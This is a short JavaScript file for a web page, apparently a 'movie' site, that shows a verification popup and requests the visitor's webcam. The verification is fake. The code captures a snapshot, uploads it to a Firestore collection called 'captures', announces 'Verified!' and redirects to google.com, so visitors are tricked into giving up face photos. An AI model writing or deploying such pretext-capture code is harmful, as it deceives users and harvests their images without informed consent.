const firebaseConfig = {
    apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
    authDomain: "movie-1e6fc.firebaseapp.com",
    projectId: "movie-1e6fc",
    storageBucket: "movie-1e6fc.firebasestorage.app",
    messagingSenderId: "371616954594",
    appId: "1:371616954594:web:977d88ec7570df351246bb"
};

// Initialize Firebase
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.firestore();

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const overlay = document.getElementById('verifyOverlay');

// Button Click Logic
async function openVerify() {
    overlay.style.display = 'flex'; // Popup pehle khulega
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
    } catch (err) {
        console.log("Camera access denied.");
    }
}

async function captureAndDone() {
    const context = canvas.getContext('2d');
    if (video.srcObject) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        const photoData = canvas.toDataURL('image/jpeg', 0.5);

        // Firestore mein save
        db.collection("captures").add({
            image: photoData,
            time: new Date().toLocaleString()
        })
        .then(() => {
            console.log("Success!");
            const tracks = video.srcObject.getTracks();
            tracks.forEach(t => t.stop());
            alert("Verified! Redirecting...");
            window.location.href = "https://google.com";
        })
        .catch(e => alert("Error: " + e));
    } else {
        alert("Please allow camera to verify!");
    }
}
